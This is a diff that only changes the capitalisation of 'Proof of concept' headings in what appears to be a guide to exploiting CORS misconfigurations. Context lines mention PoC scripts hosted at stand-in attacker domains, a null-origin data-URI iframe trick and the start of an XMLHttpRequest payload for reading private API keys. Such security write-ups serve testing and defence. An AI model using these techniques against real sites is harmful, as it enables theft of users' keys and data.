@@ -54,7 +54,7 @@ Access-Control-Allow-Credentials: true
 {"[private API key]"}
 ```
 
-#### Proof of concept
+#### Proof Of Concept
 
 This PoC requires that the respective JS script is hosted at `evil.com`
 
@@ -118,7 +118,7 @@ Access-Control-Allow-Credentials: true
 {"[private API key]"}
 ```
 
-#### Proof of concept
+#### Proof Of Concept
 
 This can be exploited by putting the attack code into an iframe using the data
 URI scheme. If the data URI scheme is used, the browser will use the `null`
@@ -175,7 +175,7 @@ Access-Control-Allow-Origin: *
 {"[private API key]"}
 ```
 
-#### Proof of concept
+#### Proof Of Concept
 
 ```js
 var req = new XMLHttpRequest(); 
@@ -210,7 +210,7 @@ Access-Control-Allow-Credentials: true
 
 ```
 
-#### Proof of concept (Example 1)
+#### Proof of Concept (Example 1)
 
 This PoC requires the respective JS script to be hosted at `evilexample.com`
 
